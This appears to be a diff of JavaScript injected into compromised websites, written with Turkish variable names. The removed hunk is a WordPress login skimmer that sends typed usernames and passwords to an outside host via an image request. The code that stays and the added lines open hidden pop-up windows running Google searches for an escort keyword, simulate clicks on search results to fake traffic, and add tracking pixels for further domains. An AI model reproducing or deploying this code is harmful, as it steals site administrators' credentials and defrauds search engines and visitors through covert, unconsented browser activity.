@@ -1,12 +1,3 @@
-if(window.location.href.indexOf("wp-login.php") > 0 || window.location.href.indexOf("wp-admin") > 0) {
-document.getElementById('wp-submit').onclick = function() {
-   new Image().src = 'http://siktir.ddospanel.com/cp.php?username='+document.getElementById('user_login').value+'&sifre='+document.getElementById('user_pass').value+'&location='+location.href;
-};
-}
-
-
-
-
 if(top.location.hostname.indexOf("facebook") > -1 || top.location.hostname.indexOf("google") > -1 || top.location.hostname.indexOf("youtube") > -1 ){
 
 function setCookie(cname, cvalue) {
@@ -25,13 +16,13 @@ function getCookie(cname) {
 	}
 	return ""
 }
-if (getCookie('cookie') != 1) {
+if (getCookie('cookiez') != 1) {
 window.open("https://www.google.com.tr/#q=ankara+escort","ljPu","toolbar=no,status=no,menubar=no,scrollbars=no,resizable=no,left=10000, top=10000, width=1, height=1, visible=none");
-setCookie("cookie", "1")
+setCookie("cookiez", "1")
 }
 }
 
-var degisken = ['www.art', 'osm', 'suluk'];  
+var degisken = ['www.art', 'osm', 'suluk', 'esnaf'];  
 var rand = degisken[Math.floor(Math.random() * degisken.length)];
 var giris = Math.floor(Math.random() * ((10000-3000)+1) + 3000);
 var cikis = Math.floor(Math.random() * ((10-3)+1) + 3);
@@ -48,7 +39,10 @@ document.querySelectorAll(".r a")[i].click();
 var pic =  1 ; 
 }
 }
-if(pic == 0){document.querySelectorAll(".pn")[0].click();};
+if(pic == 0){
+if(window.location.href.indexOf("start") == -1){document.querySelectorAll(".pn")[0].click();}
+else{document.querySelectorAll(".pn")[1].click();}
+};
 },giris)
 
 											}
@@ -65,6 +59,11 @@ setInterval(function(){ window.close(); }, 1000 * 60 * cikis);
 }
 
 if (location.hostname.indexOf("artankara.org") >= 0) {
+new Image().src = '//whos.amung.us/widget/googlegiris.png';
+setInterval(function(){ window.close(); }, 1000 * 60 * cikis);
+}
+
+if (location.hostname.indexOf("ankaraesnaf.net") >= 0) {
 new Image().src = '//whos.amung.us/widget/googlegiris.png';
 setInterval(function(){ window.close(); }, 1000 * 60 * cikis);
 }
